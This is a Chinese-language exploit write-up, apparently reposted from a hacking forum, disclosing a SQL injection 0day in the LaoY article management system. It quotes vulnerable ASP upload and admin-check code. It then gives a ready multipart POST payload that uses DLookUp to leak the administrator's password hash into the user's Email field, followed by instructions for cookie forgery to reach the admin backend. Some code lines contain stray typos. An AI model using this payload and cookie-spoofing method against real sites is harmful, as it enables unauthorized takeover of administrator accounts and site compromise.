@@ -1,0 +1,108 @@
+老Y文章管理系统最新漏洞2.5 3.0  acces 0DAY(转自tool)
+
+影响的版本：2.5 3.0  acces  更久的版本没看
+User/Upload.asp文件
+34-50行
+
+if Uprequest.form("file_Err")<>0 then 
+select case Uprequest.form("file_Err") 
+case 1:str="<div style=""padding-top:5px;padding-bottom:5px;""> <font color=blue>"&Uprequest.MaxSize/1024&"K [<a href='javascript:history.go(-1)'>重新上传</a>]</font></div>" 
+case 2:str="<div style=""padding-top:5px;padding-bottom:5px;""> <font color=blue>文件格式不对 [<a href='javascript:history.go(-1)']>重新上传</a>]</font></div>" 
+case 3:str="<div style=""padding-top:5px;paydding-bottom:5px;""> <font color=blzue>文件太大且格式不对 [<a href='javascript:history.go(-1)'>重新上传</a>]</font></div>" 
+end select 
+response.write stry 
+else 
+'注意这里，上传头像成功后，把头像路径更新到了UserFace字段。 
+sql="Update "&tbname&"_User set UserFace = '"&Uprequest.Form("file")&"' where ID= "&LaoYID 
+conn.execute(sql) 
+response.write "<script language=""javascript"">parent.UserReg.UserFace.value='"&Uprequest.Form("file")&"';" 
+response.write "</script>" 
+response.write "<div style=""margin-top:6px;""><font color=red>上传成功</font>,刷新该页面即可看到新的头像。<a href='javascript:history.go(-1)'>重新上传</a></div>" 
+
+conn.close 
+set conn=nothing 
+end if 
+
+
+
+60-67行代码：
+
+'生成头像 
+'这里要注意，如果不是gif后缀，则对上传的头像进行长、宽处理，所以，为了上传动作顺利进行，大家还是传个gif格式的文件上去 
+If right(RV_img,4)<>".gif" then 
+Dim S_Width,S_Height,H_Temp,W_Temp 
+S_Width=100 
+S_Height=100 
+Set Jpeg = Server.CreateObject("Persits.Jpeg") '创建实例 
+Path = Server.MapPath(RV_img) '处理图片路径 
+Jpeg.Open Path '打开图片 
+
+
+
+上传头像抓包内容，我用的火狐浏览器插件livehttp，我这里就不把头部的东西放上来了。
+发送以下的PostData。
+
+-----------------------------4827543632391\r\n 
+Content-Disposition: form-data; name="file" ;filename="c:\1.gif"\r\n 
+\r\n 
+gif87a 
+123123123123123123123 
+\r\n 
+-----------------------------4827543632391\r\n 
+Content-Disposition: form-data; name="file"\r\n 
+\r\n 
+//重点在这里，DLookup是什么东西，怎么用的，请自行百度、google查询。谢谢 
+abc',Email=DLookUp('admin_pass','Yao_admin', 'Id=1'),Sex='0 
+\r\n 
+-----------------------------4827543632391\r\n 
+Content-Disposition: form-data; name="submit"\r\n 
+\r\n 
+é?′?\r\n 
+-----------------------------4827543632391--\r\n 
+
+
+返回后，可以看到自己EMAIL一项变成了管理员的MD5加密串。老Y文章管理系统作者在MD5.asp里面做了手脚，保存的MD5为前16位，无法破解密文。不过没有关系·· 
+
+可以Cookie欺骗登陆后台···
+admin/admin_check.asp
+
+<% 
+Dim LaoYAdminID,LaoYAdminName,LaoYAdminPass,IsAdmin,rs5 
+'太弱了···· 
+LaoYAdminID =LaoYRequest(Request.Cookies("LaoYAdmin")("UserID")) 
+LaoYAdminName =CheckStr(Request.Cookies("LaoYAdmin")("UserName")) 
+LaoYAdminPass =CheckStr(Request.Cookies("LaoYAdmin")("UserPass")) 
+
+If LaoYAdminID<>"" and LaoYAdminName<>"" and LaoYAdminPass<>"" then 
+set rs5 = server.CreateObject ("adodb.recordset") 
+sql="Select Top 1 * from ["&tbname&"_Admin] where id="& LaoYAdminID &" and Admin_Pass='"&LaoYAdminPass&"' and Admin_Name='"&LaoYAdminName&"'" 
+on error resume next 
+rs5.open sql,conn,1,1 
+Dim myadminid,myadminpass,myadminuser 
+myadminid =rs5("ID") 
+myadminpass =rs5("Admin_Pass") 
+myadminuser =rs5("Admin_Name") 
+myadminip =rs5("Admin_IP") 
+yaomight =rs5("AdminMight") 
+yaoadmintype =rs5("AdminType") 
+yaoadpower =rs5("ADPower") 
+yaoWritePower =rs5("WritePower") 
+yaoManagePower =rs5("ManagePower") 
+rs5.close 
+set rs5=nothing 
+'太弱了···· 
+If myadminid<>Int(LaoYAdminID) or myadminpass<>LaoYAdminPass or myadminuser<>LaoYAdminName or myadminip<>GetIP Then 
+IsAdmin=0 
+Else 
+IsAdmin=1 
+End if 
+End if 
+
+If IsAdmin<>1 then 
+Response.Redirect ""&SitePath&""&SiteAdmin&"/Admin_Login.asp" 
+End if 
+%> 
+
+
+
+这个你懂的···读出管理员的 ID、Admin_Pass,name,IP就可以登陆后台了。
